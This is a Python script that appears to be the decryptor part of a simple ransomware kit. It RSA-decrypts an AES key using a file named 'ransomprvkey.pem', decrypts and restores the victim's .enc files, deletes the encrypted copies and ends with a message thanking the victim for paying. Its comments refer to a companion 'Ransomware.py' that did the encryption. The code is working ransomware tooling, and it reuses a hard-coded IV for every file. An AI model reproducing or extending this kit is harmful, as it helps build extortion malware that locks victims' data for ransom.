import glob
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import base64




#Decrypt Key Using RSA
def decryptKeyBin():
    cwd = os.getcwd()
    os.chdir(cwd)
    file_in = open("key.bin","rb")
    private_key = RSA.import_key(open("ransomprvkey.pem").read())
    enc_key = file_in.read(private_key.size_in_bytes())
    cipher_rsa = PKCS1_OAEP.new(private_key)
    AES_key = cipher_rsa.decrypt(enc_key)
    encodedKey = base64.b64encode(AES_key)
    file_out = open("key.txt","wb")
    file_out.write(encodedKey)
    file_out.close()

#Decrypt enc files 
def decryptFiles(AES_decoded):
    for filename in glob.glob("*.enc"):
        with open(filename,"r") as f:
            encrypted_data = f.read()
            loopiv = b64decode('QoMwNypSGn4R9HYHLojjcw==')
            decoded_data = b64decode(encrypted_data)
            cipher = AES.new(AES_decoded, AES.MODE_CBC, loopiv)
            decrypted_data = unpad(cipher.decrypt(decoded_data),AES.block_size)
            
            #creating a new text file with same name as encrypted file and writing decrypted data to it
            with open(filename.replace('.enc', '.txt'), "wb") as file:
                file.write(decrypted_data)
                file.close()
        
        print(filename + " was decrypted")
        #Deleting old encrypted file
        os.remove(filename)

def main():
    #Decrypt the AES_key that was generated and encodedKey
    #earlier on in Ransomware.py and store it to "key.txt"
    decryptKeyBin()
    #Reading the "Key.txt" file and decoding it so that it
    #can be used for decryption
    file_key = open('key.txt','rb')
    AES_key = file_key.read()
    AES_decoded = base64.b64decode(AES_key)
    #decrypting enc files and changing them back to txt files
    decryptFiles(AES_decoded)
    print("Thanks for the money dude. see ya")

if __name__ == '__main__':
    main()
    
